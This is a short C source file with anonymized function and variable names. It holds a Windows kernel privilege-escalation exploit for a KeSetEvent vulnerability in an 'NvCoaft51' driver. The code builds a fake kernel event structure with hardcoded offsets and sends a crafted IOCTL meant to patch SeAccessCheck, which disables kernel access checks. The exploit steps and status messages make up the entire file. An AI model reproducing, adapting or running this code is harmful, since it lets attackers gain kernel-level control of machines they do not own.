
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int WORD ;
typedef int VOID ;
typedef scalar_t__ PBYTE ;
typedef int HANDLE ;
typedef int DWORD ;
typedef int Buffer ;
typedef int BYTE ;
typedef int BOOL ;


 int FUNC_0 () ;
 int FUNC_1 (int ,int ,int*,int,int*,int,int*,int *) ;
 int VAR_0 ;
 int FUNC_2 (char*) ;
 scalar_t__ VAR_1 ;

VOID
FUNC_3(HANDLE VAR_2, PBYTE VAR_3, BOOL VAR_4)
{





  if(!VAR_4)
  {
    FUNC_2("(-)This exploit is only runs on a PAE kernel system. Sorry.\n");
  }
  else
  {
    DWORD VAR_5;
    DWORD VAR_6[1024];



    DWORD VAR_7[31];

    FUNC_2("(*)Trying to exploit the NvCoaft51 KeSetEvent vuln...\n");
    FUNC_2("(*)Writing fake event struct...\n");

    *(BYTE*)VAR_7 = 1;

    VAR_7[2] = (DWORD)&(VAR_7[3]);


    VAR_7[3] = (DWORD)&(VAR_7[4]);


    ((WORD*)VAR_7)[17] = 1;

    VAR_7[5] = (DWORD)&(VAR_7[7]);


    VAR_7[7] = (DWORD)VAR_1;







    VAR_7[30] = (DWORD)&(VAR_7[10]);
    VAR_7[10] = 0x000021FF;

    VAR_7[11] = (DWORD)(VAR_3 + 0x291B4);




    VAR_6[0] = (DWORD)(((PBYTE)(&VAR_7)) - 0x84C);


    FUNC_2("(*)Sending IOCTL...\n");
    FUNC_1(VAR_2,VAR_0,VAR_6,sizeof(VAR_6),VAR_6,sizeof(VAR_6),&VAR_5,((void*)0));
    FUNC_2("(+)IOCT sent. SeAccessCheck is now patched???\n");
  }
}
